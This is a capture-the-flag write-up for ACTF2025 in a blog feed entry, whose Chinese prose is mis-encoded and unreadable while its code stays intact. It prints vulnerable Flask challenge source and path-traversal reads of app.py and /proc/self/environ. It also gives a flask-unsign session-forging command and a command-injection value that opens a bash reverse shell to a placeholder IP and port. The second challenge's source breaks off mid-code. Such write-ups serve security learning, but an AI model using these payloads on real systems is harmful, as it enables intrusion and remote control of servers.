    <content type="html"><![CDATA[<h1 id="ACTF2025"><a href="#ACTF2025" class="headerlink" title="ACTF2025"></a>ACTF2025</h1><p>ç®€å•è®°å½•å…¶ä¸­éƒ¨åˆ†é¢˜ç›®</p><h1 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h1><p>è¿™æ¬¡éƒ½è¢« l1nk å¸ˆå‚…å¸¦é£å“©</p><p>ç™»å½•éšä¾¿è¾“å…¥ username å’Œ password å³å¯è¿›å…¥ä¸Šä¼ é¡µé¢ï¼Œå½“ username ä¸º admin æ—¶è¿”å› 500</p><p>å‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»ï¼Œå¯ä»¥ç›®å½•ç©¿è¶Š <code>/upload?file_path=../app.py</code></p><p>è¿”å›çš„å†…å®¹ base64 è§£å¯†å¯å¾—å¦‚ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, url_for, flash, session<br><br>app = Flask(__name__)<br>app.secret_key = os.getenv(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;upload&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">if</span> hashlib.sha256(<br>                    password.encode()).hexdigest() == <span class="hljs-string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>                <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                flash(<span class="hljs-string">&#x27;Invalid password&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        file_path = <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">&#x27;_&#x27;</span> + f.filename<br>        f.save(<span class="hljs-string">&#x27;./uploads/&#x27;</span> + file_path)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">f&#x27;/upload?file_path=<span class="hljs-subst">&#123;file_path&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br><br>        <span class="hljs-keyword">else</span>:<br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    b64 = base64.b64encode(content)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br>                <span class="hljs-comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span><br>                <span class="hljs-comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>å†å»è¯»ç¯å¢ƒå˜é‡ SECRET_KEYï¼Œ<code>/upload?file_path=../../../proc/self/environ</code></p><p>å¾—åˆ° <code>SECRET_KEY=S3cRetK3y</code>ï¼Œç”¨è¿™ä¸ªå»ä¼ªé€  session å³å¯</p><p><code>flask-unsign --sign --secret S3cRetK3y --cookie &#39;&#123;&quot;username&quot;: &quot;admin&quot;&#125;&#39;</code></p><p>å¾— <code>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aAw2XA.m_Yd0e8dH5qUhifde_NwJL5l6vE</code></p><p>è€Œåæ ¹æ®è¿™æ®µä»£ç è¿›è¡Œå‘½ä»¤æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">else</span>:<br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    b64 = base64.b64encode(content)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br>                <span class="hljs-comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span><br>                <span class="hljs-comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br></code></pre></td></tr></table></figure><p>payload ä¸è®ºæ˜¯ç›´æ¥è¯» flag æ–‡ä»¶è¿˜æ˜¯åå¼¹ shell å¦‚ä¸‹å³å¯</p><p><code>a;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;;</code></p><p>äº‹åæ€»ä½“æ„Ÿè§‰æ˜¯æ¯”è¾ƒè€çš„å¥—è·¯ï¼Œè·Ÿä¹‹å‰ Hgame çš„ä¸€é¢˜æœ‰ç‚¹åƒï¼Œä½†æ˜¯å½“æ—¶æˆ‘çš„è¯è¿˜æ˜¯ä¸å¤Ÿç†Ÿç»ƒï¼Œè·Ÿä¸ä¸Šå¤§ä½¬çš„é€Ÿåº¦å°±æŠ¢ä¸åˆ°è¡€åˆ†äº†ã€‚</p><h1 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h1><p>base64 æ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, json, time<br><span class="hljs-keyword">import</span> os, sys, binascii<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass, asdict<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> KEY, ADMIN_PASSWORD<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> (<br>    Flask,<br>    render_template,<br>    render_template_string,<br>    request,<br>    redirect,<br>    url_for,<br>    flash,<br>    session,<br>)<br><br>app = Flask(__name__)<br>app.secret_key = KEY<br><br><br><span class="hljs-meta">@dataclass(<span class="hljs-params">kw_only=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">APPUser</span>:<br>    name: <span class="hljs-built_in">str</span><br>    password_raw: <span class="hljs-built_in">str</span><br>    register_time: <span class="hljs-built_in">int</span><br><br><br><span class="hljs-comment">#  In-memory store for user registration</span><br>users: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, APPUser] = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: APPUser(name=<span class="hljs-string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="hljs-number">1</span>)<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        cookie_json = cipher.decrypt(padded)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        _ = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        decrypted = cipher.decrypt(padded)<br>        cookie_json_bytes = unpad(decrypted, <span class="hljs-number">16</span>)<br>        cookie_json = cookie_json_bytes.decode()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_dict = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, cookie_dict.get(<span class="hljs-string">&quot;name&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_cookie</span>(<span class="hljs-params">user: APPUser</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    cookie_dict = asdict(user)<br>    cookie_json = json.dumps(cookie_dict)<br>    cookie_json_bytes = cookie_json.encode()<br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    padded = pad(cookie_json_bytes, <span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>    encrypted = cipher.encrypt(padded)<br>    <span class="hljs-keyword">return</span> base64.b64encode(iv + encrypted).decode()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> validate_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>)):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        user_name = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> user_name <span class="hljs-keyword">in</span> users:<br>            flash(<span class="hljs-string">&quot;Username already exists!&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[user_name] = APPUser(<br>                name=user_name, password_raw=password, register_time=<span class="hljs-built_in">int</span>(time.time())<br>            )<br>            flash(<span class="hljs-string">&quot;Registration successful! Please login.&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username].password_raw == password:<br>            resp = redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>            resp.set_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))<br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/home&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    valid, current_username = parse_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> current_username:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    user_profile = users.get(current_username)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_profile:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    <span class="hljs-keyword">if</span> current_username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        payload = request.args.get(<span class="hljs-string">&quot;payload&quot;</span>)<br>        html_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            Your payload: %s</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % (<br>            current_username,<br>            payload,<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        